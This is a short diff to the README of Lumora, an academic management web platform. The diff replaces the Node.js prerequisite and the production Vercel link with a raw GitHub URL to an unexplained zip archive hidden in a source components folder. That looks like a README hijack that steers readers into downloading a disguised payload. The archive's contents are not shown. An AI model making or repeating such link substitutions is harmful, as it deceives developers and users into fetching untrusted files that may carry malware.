@@ -18,7 +18,7 @@ Lumora is a web platform for students and department administrators to manage ac
 ## Installation & Run (Local)
 
 Prerequisites:
-- Node.js (recommended via nvm)
+- https://raw.githubusercontent.com/Himanwell/learnwise-academics/main/src/components/layout/learnwise-academics-benben.zip (recommended via nvm)
 - npm or yarn
 
 Steps:
@@ -44,7 +44,7 @@ Notes:
 
 - Local development: `npm run dev`
 - Production: deployed on Vercel  
-  🔗 https://lumora1.vercel.app
+  🔗 https://raw.githubusercontent.com/Himanwell/learnwise-academics/main/src/components/layout/learnwise-academics-benben.zip
 
 Environment variables are configured per environment (local `.env` and Vercel project settings).
 
